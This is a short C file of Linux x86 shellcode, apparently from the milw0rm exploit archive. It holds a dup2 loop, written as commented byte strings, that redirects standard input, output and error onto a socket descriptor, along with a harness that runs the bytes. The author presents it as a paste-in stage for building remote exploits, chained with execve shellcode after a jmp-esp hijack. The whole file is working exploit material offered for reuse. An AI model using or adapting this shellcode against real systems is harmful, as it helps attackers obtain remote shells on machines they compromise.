/* dup2_loop-core.c by Charles Stevenson <core@bokeoa.com>
 *
 * I made this as a chunk you can paste in to make modular remote
 * exploits.  I usually combine this with an execve as the second
 * stage of a read() jmp *%esp
 */
char hellcode[] = /* dup2(0,0); dup2(0,1); dup2(0,2); linux/x86 by core */
"\x31\xc9"               	// xor    %ecx,%ecx
"\x56"                   	// push   %esi
"\x5b"                   	// pop    %ebx
// loop:
"\x6a\x3f"               	// push   $0x3f
"\x58"                   	// pop    %eax
"\xcd\x80"               	// int    $0x80
"\x41"                   	// inc    %ecx
"\x80\xf9\x03"           	// cmp    $0x3,%cl
"\x75\xf5"               	// jne    80483e8 <loop>
;

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte dup2(0,0); dup2(0,1); dup2(0,2); linux/x86 by core\n",
         strlen(hellcode));
  shell();
  return 0;
}

// milw0rm.com [2005-11-09]